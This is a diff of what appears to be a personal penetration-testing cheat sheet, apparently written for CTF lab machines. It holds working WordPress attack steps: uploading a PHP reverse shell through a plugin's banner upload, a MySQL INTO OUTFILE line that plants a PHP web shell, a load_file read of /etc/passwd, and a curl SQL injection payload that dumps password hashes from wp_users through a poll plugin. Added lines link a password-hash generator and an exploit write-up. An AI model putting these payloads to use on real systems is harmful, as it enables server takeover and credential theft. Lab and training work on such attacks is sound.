@@ -237,6 +237,9 @@ Wordpress
 3. Add Plugin --> uploads
 4. AdRotate --> Manage Media --> Upload new banner --> shell.php.zip  # http://loly.lc/wordpress/wp-content/banners/php-reverse-shell.php
 Review /uploads and write perms
+
+Generate pwd
+https://www.useotools.com/es/wordpress-password-hash-generator/output
 	
 ```bash
 root@kali# cat hash_wp
@@ -355,6 +358,8 @@ select load_file('/etc/passwd');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
 ```
 ```bash
+https://cosmiclayton.medium.com/wordpress-plugin-survey-poll-1-5-7-3-sss-params-sql-injection-e342ea7b9cdb
+# Wordpress
 curl -X POST -d "action=spAjaxResults&pollid=-7159 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,user_pass,NULL from wordpress_db.wp_users --" http://sunset-midnight/wp-admin/admin-ajax.php
 ```
 	
